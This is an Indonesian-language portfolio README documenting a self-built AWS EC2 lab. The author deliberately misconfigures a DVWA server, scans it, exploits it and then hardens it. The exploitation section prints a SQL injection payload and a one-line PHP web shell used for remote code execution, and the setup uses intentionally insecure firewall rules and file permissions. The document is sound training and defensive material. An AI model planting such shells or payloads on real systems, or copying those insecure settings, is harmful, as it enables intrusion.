# Portofolio Keamanan AWS - Shalahuddin Al-Ayyubi

Selamat datang di portofolio proyek keamanan cloud saya. Repositori ini berisi dokumentasi dan artefak dari proyek-proyek yang saya kerjakan untuk mendemonstrasikan keahlian saya di bidang AWS, Pentesting, dan Otomatisasi Keamanan.

---

## Daftar Proyek

### Proyek 1: Analisis Kerentanan & Hardening EC2
* **Tujuan:** Mensimulasikan setup server yang sengaja dibuat rentan di **AWS EC2**, kemudian melakukan pemindaian keamanan, eksploitasi, dan diakhiri dengan proses *hardening* (perbaikan) menggunakan AWS Security Groups dan konfigurasi server yang aman.
* **Teknologi:** `AWS EC2`, `Security Groups`, `Apache2`, `PHP`, `MySQL`, `DVWA`, `Nmap`, `Nikto`.
* **Status:** `Selesai` 🎉

### Proyek 2: "Flag API" Serverless
* **Tujuan:** Membangun sebuah API sederhana untuk *submit flag* CTF menggunakan arsitektur *serverless* (tanpa server).
* **Teknologi:** `AWS Lambda`, `AWS API Gateway`, `Python`.
* **Status:** `Belum Dimulai`

### Proyek 3: Mini-CTF dengan Scoreboard
* **Tujuan:** Menggabungkan Proyek 1 & 2 untuk membuat sebuah platform mini-CTF lengkap dengan *scoreboard* yang dinamis.
* **Teknologi:** `AWS EC2`, `Lambda`, `API Gateway`, `DynamoDB`.
* **Status:** `Belum Dimulai`

---

## Detail Proyek 1: Analisis Kerentanan & Hardening EC2

Proyek ini saya bagi menjadi beberapa fase: mulai dari *setup* infrastruktur dan aplikasi yang sengaja dibuat rentan, analisis kerentanan, eksploitasi, hingga *hardening*.

### Fase 1: Setup Infrastruktur Awal (AWS EC2)

Langkah pertama adalah menyiapkan 'medan pertempuran'-nya: sebuah *instance* **EC2** baru dengan konfigurasi yang sengaja dibuat kurang aman.
* **Name:** `Project1-Vulnerable-Server`
* **OS (AMI):** `Ubuntu Server 24.04 LTS` (pilih yang *Free tier eligible*)
* **Instance Type:** `t2.micro` (juga *Free tier eligible*)
* **Key Pair:** `aws-project1-key` (dibuat baru, file `.pem` disimpan aman)

![Konfigurasi Nama Server](./Screenshot%202025-10-26%20012900.png)
![Konfigurasi OS Ubuntu](./Screenshot%202025-10-26%20012933.png)
![Konfigurasi Instance Type t2.micro](./Screenshot%202025-10-26%20013020.png)
![Konfigurasi Key Pair](./Screenshot%202025-10-26%20013120.png)

* #### Konfigurasi Firewall (Security Group) - Sengaja Dibuka Lebar
Bagian krusial di fase *setup* ini adalah **Security Group**. Saya sengaja membuat aturan *inbound* yang sangat permisif untuk simulasi:
* **Security Group Name:** `Project1-Vulnerable-SG`
* **Inbound Rules Awal:**
    1.  `Type: SSH` (Port 22), `Source: Anywhere (0.0.0.0/0)` -> Risiko *brute force*.
    2.  `Type: HTTP` (Port 80), `Source: Anywhere (0.0.0.0/0)` -> Untuk akses web.
    3.  `Type: All traffic` (All ports), `Source: Anywhere (0.0.0.0/0)` -> Membuka semua port, sangat berbahaya.

![Konfigurasi Security Group Name](./Screenshot%202025-10-26%20013337.png)
![Konfigurasi Security Group Rules Awal (Rentan)](./Screenshot%202025-10-26%20013349.png)

### Fase 2: Setup Server & Aplikasi Target (DVWA)

Setelah *instance* siap, saya login via SSH dan mulai menyiapkan *web server* beserta aplikasi yang akan jadi target.

1.  **Update Server:** Biasakan update dulu.
    ```bash
    apt update && apt upgrade -y
    ```
    ![Terminal apt update upgrade](./Screenshot%202025-10-26%20013904.png)

2.  **Instal LAMP Stack:** Pasang **Apache, MySQL, PHP** dan modul-modul yang diperlukan.
    ```bash
    apt install apache2 php libapache2-mod-php php-mysql mysql-server -y
    ```
    ![Terminal install apache2](./Screenshot%202025-10-26%20014011.png)
    ![Terminal install PHP & MySQL](./Screenshot%202025-10-26%20014254.png)

3.  **Verifikasi Web Server:** Cek IP publik di browser, pastikan halaman default Apache muncul.
    ![Verifikasi Halaman Apache](./Screenshot%202025-10-26%20014118.png)

4.  **Instal DVWA:** *Clone* aplikasi **Damn Vulnerable Web Application** dari GitHub sebagai target latihan.
    ```bash
    git clone [https://github.com/digininja/DVWA.git](https://github.com/digininja/DVWA.git) /var/www/html/dvwa
    ```
    ![Terminal git clone DVWA](./Screenshot%202025-10-26%20014346.png)

5.  **Konfigurasi Izin File (Sengaja Dibuat Rentan):** Ini bagian penting simulasi kerentanan. Saya set izin `777` (bisa dibaca, ditulis, dieksekusi oleh siapa saja) ke folder DVWA.
    ```bash
    chmod -R 777 /var/www/html/dvwa
    ```
    ![Terminal chmod 777 (Rentan)](./Screenshot%202025-10-26%20014518.png)

6.  **Setup Database & DVWA:** Edit `config.inc.php` DVWA, atur database MySQL, lalu selesaikan setup DVWA lewat browser.

### Fase 3: Analisis Kerentanan Awal (Sebelum Diserang)

Dari *setup* di atas, server ini punya beberapa vektor serangan yang sengaja dibuat:
1.  **Level Infrastruktur:** *Security Group* terlalu terbuka (`SSH Anywhere`, `All Traffic Anywhere`).
2.  **Level Server:** Izin file `777` memungkinkan *user* `www-data` (Apache) mengeksekusi file di direktori web, fatal jika ada celah *file upload*.
3.  **Level Aplikasi:** DVWA sendiri penuh lubang (SQLi, File Upload, XSS, dll).

---

### Fase 4: Pengujian & Eksploitasi (Menyerang Target)

Dengan *attack machine* (Kali Linux), saya mulai melakukan simulasi serangan.

#### 1. Reconnaissance (Nmap)
Pemindaian **Nmap** untuk memetakan *port* dan layanan yang aktif.
```bash
nmap -sV -T4 98.93.196.5
````

  * **Temuan:** Port **SSH (22)**, **DNS (53)**, dan **HTTP (80)** terkonfirmasi terbuka. Menariknya, **MySQL (3306)** tidak terdeteksi dari luar, menunjukkan konfigurasi *default* MySQL sudah cukup aman (*listening* di `127.0.0.1`), meskipun *firewall* (Security Group) terbuka lebar. Ini contoh bagus *Defense in Depth* level aplikasi.

#### 2\. Vulnerability Assessment (Nikto)

Pemindaian **Nikto** pada aplikasi web (`/dvwa/`) untuk mencari miskonfigurasi dan file sensitif.

```bash
nikto -h [http://98.93.196.5/dvwa/](http://98.93.196.5/dvwa/)
```

  * **Temuan Utama:** *Header* keamanan (X-Frame-Options, X-Content-Type-Options) tidak ada, *Directory Indexing* aktif di folder `/config/`, `/database/`, dll., dan yang paling kritis, direktori `.git` terekspos, memungkinkan potensi pencurian *source code*.

#### 3\. Exploitation (Eksploitasi)

**a. SQL Injection (SQLi)**
Menargetkan modul "SQL Injection" di DVWA (Level: Low).

  * **Payload:** `' OR 1=1 #`
  * **Hasil:** Berhasil\! *Payload* ini mem-bypass filter `WHERE` dan query SQL mengembalikan semua *record* dari tabel `users`.

**b. Web Shell Upload & Remote Code Execution (RCE)**
Memanfaatkan kombinasi celah "File Upload" di DVWA dan izin `chmod 777` pada server.

  * **Pembuatan Shell:** Membuat file `shell.php` sederhana di Kali.
    ```bash
    echo '<?php system($_GET["cmd"]); ?>' > ~/Desktop/shell.php
    ```
  * **Upload:** Mengunggah `shell.php` melalui fitur *upload* DVWA.
  * **Eksekusi (RCE):** Mengakses *shell* via URL dan menyisipkan perintah (`?cmd=whoami`).
    `http://98.93.196.5/dvwa/hackable/uploads/shell.php?cmd=whoami`
  * **Hasil:** Server merespons dengan **`www-data`**, mengonfirmasi **Remote Code Execution** berhasil didapatkan sebagai *user* Apache.

**Kesimpulan Eksploitasi:** Kombinasi kerentanan aplikasi (SQLi, File Upload), izin file server yang terlalu permisif (`777`), dan *firewall* yang lemah (Security Group) memungkinkan kompromi penuh terhadap *web server*.

-----

### Fase 5: Hardening (Memperbaiki Celah)

Setelah berhasil dieksploitasi, langkah terakhir adalah memperbaiki semua kerentanan yang ditemukan.

#### 1\. Memperbaiki Firewall (Security Group)

Aturan *Inbound* **Security Group** diperketat secara signifikan:

  * Aturan `All traffic` **dihapus**.
  * Aturan `SSH` diubah *Source*-nya menjadi **`My IP`** (hanya IP saya yang bisa SSH).
  * Aturan `HTTP` dibiarkan `Anywhere` (agar web tetap bisa diakses).

#### 2\. Memperbaiki Izin File Server

Izin `777` dicabut total. Kepemilikan file diatur ke `www-data`, izin direktori diubah ke `755`, izin file ke `644`, kecuali folder `uploads` (`775`) dan `config.inc.php` (`664`).

```bash
sudo chown -R www-data:www-data /var/www/html/dvwa
sudo find /var/www/html/dvwa -type d -exec chmod 755 {} \;
sudo find /var/www/html/dvwa -type f -exec chmod 644 {} \;
sudo chmod 775 /var/www/html/dvwa/hackable/uploads
sudo chmod 664 /var/www/html/dvwa/config/config.inc.php
```

#### 3\. Memperbaiki Konfigurasi Apache

Konfigurasi Apache (`000-default.conf`) disesuaikan:

  * **Directory Indexing dinonaktifkan** (opsi `Indexes` dihapus).
  * Akses ke direktori `.git` **diblokir** via `<DirectoryMatch>`.

<!-- end list -->

```apache
<Directory /var/www/html>
    Options FollowSymLinks MultiViews
    AllowOverride All
    Require all granted
</Directory>

<DirectoryMatch "/\.git(/.*)?$">
    Require all denied
</DirectoryMatch>
```

Apache di-restart setelahnya:

```bash
sudo systemctl daemon-reload
sudo systemctl restart apache2
```

#### 4\. Menonaktifkan Eksekusi PHP di Folder Uploads (`.htaccess`)

Sebagai lapisan pertahanan tambahan (karena `chmod 644` saja ternyata tidak cukup di *setup* ini), saya menambahkan file `.htaccess` di direktori `uploads` (`/var/www/html/dvwa/hackable/uploads/`) untuk secara eksplisit memblokir eksekusi PHP.

```apache
<Files "*.php">
    Require all denied
</Files>
php_flag engine off
```

#### 5\. Verifikasi Hardening

Pengujian ulang setelah *hardening*:

  * **Directory Indexing:** Mengakses `/dvwa/config/` kini menghasilkan **403 Forbidden**. ✅
  * **Web Shell Execution:** Mengakses `shell.php` yang di-*upload* (`.../shell.php?cmd=whoami`) kini juga menghasilkan **403 Forbidden**. Eksekusi PHP berhasil diblokir. ✅

**Kesimpulan Hardening:** Melalui perbaikan berlapis pada *firewall* (Security Group), izin file sistem, konfigurasi *web server* (Apache), dan pembatasan eksekusi skrip (`.htaccess`), kerentanan utama yang sebelumnya dieksploitasi berhasil ditutup, membuat server jauh lebih aman.
